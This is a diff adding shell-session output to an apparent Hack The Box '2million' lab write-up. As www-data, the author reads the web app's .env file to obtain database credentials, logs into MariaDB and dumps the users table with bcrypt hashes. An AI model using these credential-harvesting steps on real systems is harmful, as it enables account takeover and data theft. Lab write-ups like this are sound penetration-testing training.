@@ -679,4 +679,85 @@ www-data@2million:~/html$
 
 ```
 
+``` bash
+
+www-data@2million:~/html$ ls -la
+total 56
+drwxr-xr-x 10 root root 4096 Jul 30 01:00 .
+drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
+-rw-r--r--  1 root root   87 Jun  2  2023 .env
+-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
+-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
+drwxr-xr-x  5 root root 4096 Jul 30 01:00 VPN
+drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
+drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
+drwxr-xr-x  5 root root 4096 Jun  6  2023 css
+drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
+drwxr-xr-x  2 root root 4096 Jun  6  2023 images
+-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
+drwxr-xr-x  3 root root 4096 Jun  6  2023 js
+drwxr-xr-x  2 root root 4096 Jun  6  2023 views
+www-data@2million:~/html$ cat .env
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+www-data@2million:~/html$
+
+```
+
+``` bash
+
+www-data@2million:~/html$ mysql -u admin -p
+Enter password:
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 72288
+Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| htb_prod           |
+| information_schema |
++--------------------+
+2 rows in set (0.000 sec)
+
+MariaDB [(none)]> USE htb_prod;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [htb_prod]>
+
+```
+
+``` bash
+
+MariaDB [htb_prod]> SHOW TABLES;
++--------------------+
+| Tables_in_htb_prod |
++--------------------+
+| invite_codes       |
+| users              |
++--------------------+
+2 rows in set (0.000 sec)
+
+MariaDB [htb_prod]> SELECT * FROM users;
++----+--------------+----------------------------+--------------------------------------------------------------+----------+
+| id | username     | email                      | password                                                     | is_admin |
++----+--------------+----------------------------+--------------------------------------------------------------+----------+
+| 11 | TRX          | trx@hackthebox.eu          | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |        1 |
+| 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK |        1 |
+| 13 | test         | test@test.com              | $2y$10$/BeV5batdT89Kuwph5Vvtef6c7h4Xl9NtONXu6Zwrp25mXaf57LqS |        1 |
++----+--------------+----------------------------+--------------------------------------------------------------+----------+
+3 rows in set (0.000 sec)
+
+MariaDB [htb_prod]>
+
+```
 
